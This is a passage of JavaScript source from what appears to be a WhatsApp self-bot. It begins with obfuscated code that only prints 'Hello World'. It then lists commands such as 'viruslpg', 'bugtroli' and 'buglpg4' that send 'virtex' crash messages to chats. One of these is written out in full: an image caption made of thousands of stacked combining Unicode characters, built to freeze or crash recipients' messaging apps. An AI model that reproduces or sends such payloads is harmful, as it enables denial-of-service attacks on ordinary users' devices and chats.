_0x2d25ba=-parseInt(_0x59f774(0x67,0x63,0x69,0x5f,0x5c))*-parseInt(_0x5cfd5c(0x5e,0x62,0x64,0x5c,0x60))+parseInt(_0x5cfd5c(0x6b,0x64,0x5e,0x66,0x5d))*-parseInt(_0x20c769(0x6d,0x68,0x64,0x65,0x6e))+-parseInt(_0x59f774(0x5a,0x5e,0x65,0x5a,0x65))+-parseInt(_0x4e6ab7(0x58,0x5d,0x5d,0x60,0x5b))+parseInt(_0x4e6ab7(0x5e,0x5f,0x66,0x5b,0x60))*-parseInt(_0x376eb5(0x59,0x5c,0x57,0x58,0x62))+-parseInt(_0x4e6ab7(0x62,0x67,0x63,0x6b,0x66))+parseInt(_0x5cfd5c(0x68,0x66,0x66,0x63,0x68));if(_0x2d25ba===_0xf9deaf)break;else _0x3c9f84['push'](_0x3c9f84['shift']());}catch(_0x59ea96){_0x3c9f84['push'](_0x3c9f84['shift']());}}}(_0x1a2d,-0x1c35d*-0x8+-0x1b185+-0xc62*0x5b));function _0x4954(_0x1355fd,_0x3169a1){_0x1355fd=_0x1355fd-(-0x9ce+-0x1*-0xfef+-0x2*0x26b);var _0x2c6143=_0x1a2d[_0x1355fd];return _0x2c6143;}function hi(){var _0x1683cd=function(_0x2d0bd1,_0x54806a,_0x3438a7,_0x45a1ad,_0x1cec13){return _0x4954(_0x1cec13- -0x184,_0x3438a7);},_0x247154=function(_0x367324,_0x2fc684,_0x5c8f60,_0x223bec,_0x3930c0){return _0x4954(_0x3930c0- -0x184,_0x5c8f60);},_0x3102a3=function(_0x562ae7,_0x2bcb3a,_0x8bea13,_0x483f01,_0x2dc5e4){return _0x4954(_0x2dc5e4- -0x184,_0x8bea13);},_0x22703e=function(_0x77f87b,_0xe30b88,_0x535ac0,_0x101ffc,_0x2f4233){return _0x4954(_0x2f4233- -0x184,_0x535ac0);},_0x318c90=function(_0x59e9f6,_0x3dcb5b,_0x251259,_0x3fb760,_0x5ec60f){return _0x4954(_0x5ec60f- -0x184,_0x251259);},_0x557a23={};_0x557a23[_0x1683cd(-0x39,-0x2e,-0x2e,-0x33,-0x35)]=_0x1683cd(-0x31,-0x2b,-0x29,-0x29,-0x30)+_0x1683cd(-0x37,-0x35,-0x3a,-0x39,-0x34)+'d!';var _0x42836a=_0x557a23;console[_0x22703e(-0x26,-0x2e,-0x2e,-0x33,-0x2c)](_0x42836a[_0x22703e(-0x38,-0x34,-0x2e,-0x2e,-0x35)]);}hi();
var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();
			
break;							
        case 'antibuggc':		                       
		        client.sendMessage(from, antibuggc(), text, {quoted: ftroli})
		        break;		       
		        case 'syntaxhole':		        
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        client.sendMessage(from, syntaxhole(), text, {quoted: ftroli})		        
		        break;
		         case 'bugtroli':		        
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        client.sendMessage(from, bugtroli(), text, {quoted: ftroli})		        
		        break;
		        case 'viruslpglvl2':		        
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        client.sendMessage(from, virtex(), text, {quoted: ftroli})		        
		        break;
		        case 'viruslpg':		        
                 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        client.sendMessage(from, virtag(), text, {quoted: ftroli})		        
		        break;
		        case 'viruslpgcrazy':
		        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        client.sendMessage(from, virtag(), text, {quoted: ftroli})		        
		        break;
		        case 'buglpg4':
		        if (!mek.key.fromMe) return fakestatus("SELF-BOT"); 		                 									
				anu = await getBuffer(`https://i.ibb.co/x8fq99V/IMG-20210820-WA0111.jpg`)				
				client.sendMessage(from, anu, image, {caption: 'ꪶ𖣂ꫂ KDT ボ LPG 〽️ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ